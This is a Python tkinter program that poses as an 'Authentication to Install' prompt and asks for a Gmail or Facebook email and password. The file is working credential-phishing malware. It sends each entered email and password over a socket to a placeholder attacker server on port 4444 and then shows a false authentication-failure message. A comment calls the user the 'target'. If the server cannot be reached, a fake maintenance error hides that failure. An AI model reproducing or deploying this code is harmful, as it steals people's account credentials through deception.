from tkinter import *;
from tkinter import messagebox;
from tkinter.ttk import *;
from email_validator import validate_email,EmailNotValidError
import socket;

REMOTE_IP = "[Server-IP-Address]"
REMOTE_PORT = 4444 # Server Port Number

#when gmail and password check are finished, execute this login
def login(gwindow,gmail,password,isFacebook):
    #close form window
    gwindow.destroy();
    gresult_window = Toplevel()
    gresult_window.geometry("550x150")
    gresult_window.resizable(False,False)
    gresult_window.title("Process")
    mylabel = Label(gresult_window,text="Authenticating . . ",font=("Courier","10"),foreground="maroon")
    mylabel.pack(pady=30)
    # if it is gmail, the word starts with G or not it starts with F
    # G means Gmail
    # F means Facebook
    text = f"G gmail:{gmail} and password:{password}" if isFacebook == False else f"F gmail:{gmail} and password:{password}"
    client.send(text.encode())
    result = client.recv(1024)
    mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")

def btn_Event(isFacebook):
    gwindow = Toplevel()
    gwindow.geometry("350x320")
    gwindow.title("Facebook" if isFacebook else "Gmail")
    def checkForm(gmail,gpass):
        if(gmail == ""):
            result.config(text="Please fill your gmail")
        elif(gpass == ""):
            result.config(text="Please fill your password")
        else:
            try:
                #validate email
                email = validate_email(gmail).email
                if(len(gpass) < 8):
                    result.config(text="Your password is under 8 characters")   
                else:
                    login(gwindow=gwindow,gmail=gmail,password=gpass,isFacebook=isFacebook)
            except EmailNotValidError:
                result.config(text="Your gmail is invalid")
    result = Label(gwindow,text="",font=("Courier",9),foreground="maroon")
    result.pack(pady=5)
    Label(gwindow,text="Email :",font=("Arial",10)).pack(pady=10)
    gmail = Entry(gwindow)
    gmail.focus_set()
    gmail.pack(pady=10)
    Label(gwindow,text="Password :",font=("Arial",10)).pack(pady=5)
    gpass = Entry(gwindow,show="*")
    gpass.pack(pady=10)
    gbtn = Button(gwindow,text="Login",command=lambda:checkForm(gmail=gmail.get(),gpass=gpass.get()))
    gbtn.pack(pady=20)

client = socket.socket()
client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
client.settimeout(2000)
try:
    client.connect((REMOTE_IP,REMOTE_PORT))
    window = Tk();
    window.title("Login")
    window.geometry("400x200")
    window.resizable(False,False)
    lbl1 = Label(text="Authentication to Install",font=("Arial",15)).pack(pady=10)
    btn1 = Button(text="Gmail Login",width=25,command=lambda:btn_Event(False))
    btn1.pack(pady=20)
    btn2 = Button(text="Facebook Login",width=25,command=lambda:btn_Event(True))
    btn2.pack(pady=20)
    mainloop()
except:
    #what if target can't connect to attacter server, this will be shown
    messagebox.showerror("SERVER ERROR","Server is now in maintainence, Please try again later. Sorry for your inconvience")
